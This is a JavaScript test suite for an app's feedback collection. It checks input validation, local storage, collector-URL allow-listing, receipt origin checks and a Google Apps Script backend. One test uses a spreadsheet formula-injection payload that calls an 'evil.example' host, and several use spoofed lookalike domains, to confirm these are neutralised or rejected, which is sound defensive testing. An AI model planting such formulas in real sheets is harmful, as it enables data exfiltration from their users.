import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import {readFile} from 'node:fs/promises';
import {blankFeedback,validateAnswers,createReport,publicReport,saveReport,readReports,updateDelivery,deleteReport,FEEDBACK_KEY,reportText} from '../feedback.js';
import {collectorURL,trustedReceipt} from '../feedback-transport.js';
const ID='12345678-1234-4123-8123-123456789abc',NONCE='98765432-1234-4123-8123-123456789abc';
const answers=()=>({...blankFeedback(),features:{...blankFeedback().features,lessons:'worked'},ease:'easy'});
const report=()=>createReport(answers(),{language:'ml',appVersion:'0.7.1',platform:'web',system:'linux'},1770000000000,ID);
function memory(){const map=new Map();return {getItem:k=>map.get(k)||null,setItem:(k,v)=>map.set(k,v),removeItem:k=>map.delete(k)};}
test('feedback requires an actual tried feature and ease selection; comments are optional',()=>{
  assert.throws(()=>validateAnswers(blankFeedback(),'ml'),/easy/);
  assert.throws(()=>validateAnswers({...blankFeedback(),ease:'easy'},'ml'),/at least one/);
  assert.equal(validateAnswers(answers(),'ml').comment,'');
  assert.throws(()=>validateAnswers({...answers(),issues:['none','slow']},'ml'),/either/);
  assert.throws(()=>validateAnswers({...answers(),comment:'x'.repeat(1501)},'ml'),/1,500/);
  assert.throws(()=>validateAnswers({...answers(),features:{...answers().features,malicious:'worked'}},'ml'),/Invalid/);
  assert.equal(validateAnswers({...answers(),features:{...answers().features,tracing:'worked'}},'fr').features.tracing,'not_tried');
});
test('local reports retain delivery independently and public exports contain no learning history',()=>{
  const storage=memory(),r=report();saveReport(r,storage);
  assert.equal(readReports(storage)[0].delivery.status,'local');
  updateDelivery(ID,{status:'confirmed',destination:'https://script.google.com/macros/s/demo/exec',receivedAt:'2026-11-06T12:00:00.000Z'},storage);
  const saved=readReports(storage)[0];assert.equal(saved.delivery.status,'confirmed');
  assert.equal(publicReport(saved).delivery,undefined);assert.deepEqual(Object.keys(publicReport(saved)).sort(),['answers','appVersion','createdAt','id','language','platform','system']);
  assert.match(reportText(saved),/Collector confirmed receipt/);assert.match(reportText(saved),/Optional details: None/);
  assert.throws(()=>saveReport(r,storage),/already saved/);
  deleteReport(ID,storage);assert.deepEqual(readReports(storage),[]);
});
test('corrupt or full local feedback stores are preserved rather than silently overwritten',()=>{
  const storage=memory();storage.setItem(FEEDBACK_KEY,'broken');assert.throws(()=>saveReport(report(),storage),/could not be read/);assert.equal(storage.getItem(FEEDBACK_KEY),'broken');
  storage.removeItem(FEEDBACK_KEY);const r=report();
  for(let n=0;n<100;n++)saveReport({...r,id:`report-unique-id-${n}`},storage);
  const before=storage.getItem(FEEDBACK_KEY);assert.throws(()=>saveReport(r,storage),/100 reports/);assert.equal(storage.getItem(FEEDBACK_KEY),before);
  assert.throws(()=>saveReport(r,{getItem:()=>null,setItem:()=>{throw Error('quota');}}),/could not be saved/);
});
test('only exact public Apps Script exec URLs can be configured',()=>{
  assert.equal(collectorURL(' https://script.google.com/macros/s/demo-ID_123/exec '),'https://script.google.com/macros/s/demo-ID_123/exec');
  for(const url of ['http://script.google.com/macros/s/id/exec','https://script.google.com.evil.example/macros/s/id/exec','https://script.google.com/macros/s/id/dev','https://script.google.com/macros/s/id/exec?key=secret','https://docs.google.com/spreadsheets/d/ID/edit','https://script.google.com:444/macros/s/id/exec'])assert.throws(()=>collectorURL(url));
});
test('delivery receipts must match Google origin, the created frame, nonce, and report ID',()=>{
  const frame={},nested={parent:frame};frame.parent=frame;
  const event={origin:'https://n-example-script.googleusercontent.com',source:nested,data:{type:'bhaasa-feedback-receipt-v1',requestId:NONCE,reportId:ID,ok:true}};
  assert.equal(trustedReceipt(event,frame,ID,NONCE),true);
  for(const origin of ['null','http://script.google.com','https://script.google.com.evil.example','https://evil.example','https://script.google.com:8443'])assert.equal(trustedReceipt({...event,origin},frame,ID,NONCE),false);
  const unrelated={};unrelated.parent=unrelated;
  assert.equal(trustedReceipt({...event,source:unrelated},frame,ID,NONCE),false);
  assert.equal(trustedReceipt(event,frame,ID,'wrong'),false);
  assert.equal(trustedReceipt(event,frame,'wrong',NONCE),false);
});

const source=await readFile(new URL('../feedback-apps-script/Code.gs',import.meta.url),'utf8');
function collector({configured=true,locked=false,fail=false}={}){
  const rows=[],state={flushed:false,released:0},sheet={getLastRow:()=>rows.length,appendRow:row=>rows.push(row),setFrozenRows:()=>{},getRange:(row,column)=>({getValue:()=>rows[row-1][column-1],createTextFinder:id=>({matchEntireCell:()=>({findNext:()=>{const found=rows.findIndex((r,n)=>n>0&&r[0]===id);return found<0?null:{getRow:()=>found+1};}})})})};
  const context={PropertiesService:{getScriptProperties:()=>({getProperty:()=>configured?'PRIVATE_SHEET_ID':null})},LockService:{getScriptLock:()=>({tryLock:()=>!locked,hasLock:()=>!locked,releaseLock:()=>state.released++})},SpreadsheetApp:{openById:()=>{if(fail)throw Error('private detail PRIVATE_SHEET_ID');return {getSheetByName:()=>rows.length?sheet:null,insertSheet:()=>sheet};},flush:()=>{state.flushed=true;}},HtmlService:{XFrameOptionsMode:{ALLOWALL:'ALLOWALL'},createHtmlOutput:html=>({html,setXFrameOptionsMode(value){this.mode=value;return this;}})}};
  vm.createContext(context);vm.runInContext(source,context);
  return {rows,state,context,post:(r=publicReport(report()))=>{
    const output=context.doPost({parameter:{payload:JSON.stringify({requestId:NONCE,report:r})}});
    const receipt=JSON.parse(output.html.match(/postMessage\((.*),"\*"\)/)[1]);
    return {...output,receipt};
  }};
}
test('Apps Script appends and flushes a private Sheet row before acknowledging, with idempotent retry',()=>{
  const c=collector(),first=c.post();assert.equal(first.receipt.ok,true);assert.equal(first.mode,'ALLOWALL');assert.equal(c.state.flushed,true);assert.equal(c.state.released,1);assert.equal(c.rows.length,2);assert.equal(c.rows[0].length,c.rows[1].length);
  const again=c.post();assert.equal(again.receipt.duplicate,true);assert.equal(again.receipt.receivedAt,first.receipt.receivedAt);assert.equal(c.rows.length,2);assert.equal(c.state.released,2);
  assert.doesNotMatch(first.html,/PRIVATE_SHEET_ID/);assert.doesNotMatch(c.context.doGet().html,/PRIVATE_SHEET_ID/);
});
test('Apps Script rejects malformed, unsolicited, and excessive fields without writing a row',()=>{
  const c=collector();
  for(const r of [{...publicReport(report()),apiKey:'no'}, {...publicReport(report()),answers:{...answers(),comment:'x'.repeat(1501)}}, {...publicReport(report()),answers:{...answers(),features:{}}}, {...publicReport(report()),language:'unknown'}]){assert.equal(c.post(r).receipt.ok,false);assert.equal(c.post(r).receipt.code,'invalid_report');}
  assert.equal(c.rows.length,0);assert.match(c.context.doPost({parameter:{payload:'not JSON'}}).html,/invalid_report/);
});
test('Apps Script returns no success when configuration, locking, or Sheets write fails',()=>{
  for(const [config,code] of [[{configured:false},'not_configured'],[{locked:true},'busy'],[{fail:true},'write_failed']]){const c=collector(config),output=c.post();assert.equal(output.receipt.ok,false);assert.equal(output.receipt.code,code);assert.equal(c.rows.length,0);assert.doesNotMatch(output.html,/PRIVATE_SHEET_ID|private detail/);}
});
test('Google Sheets stores formula-like comments as text and receipts reveal no comment',()=>{
  for(const comment of ['=IMPORTXML("https://evil.example", "x")',' +SUM(A1:A9)','@SUM(1)','-1+2']){const c=collector(),r=publicReport(report());r.answers.comment=comment;const output=c.post(r);assert.equal(output.receipt.ok,true);assert.equal(c.rows[1].at(-1),"'"+comment);assert.ok(!output.html.includes(comment));}
});
